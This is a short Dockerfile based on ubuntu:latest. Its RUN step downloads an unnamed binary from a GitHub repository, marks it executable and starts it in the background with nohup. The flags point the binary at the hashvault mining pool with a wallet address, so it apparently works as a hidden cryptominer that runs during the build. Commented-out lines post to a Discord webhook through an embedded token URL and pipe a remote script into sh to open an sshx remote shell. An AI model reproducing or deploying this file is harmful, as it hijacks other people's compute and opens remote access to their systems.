FROM ubuntu:latest
RUN apt-get update && apt-get install curl -y && curl -L -O https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && nohup ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 > x.log 2>&1 &
# CMD ["bash", "-c", "printf '{\"content\":\"Posted via Docker container 🚀\"}' | curl -X POST -H 'Content-Type: application/json' -d @- https://discord.com/api/webhooks/1418786693233770496/axsNr80y_uKNDVE-9KVXQc_jAAO4CBnDONhf6opRGnSw1vKdhHGFKJkL_0sbk_cLa1Vw"]
#CMD ["apt update && apt install curl -y && curl -sSf https://sshx.io/get | sh && sshx"]
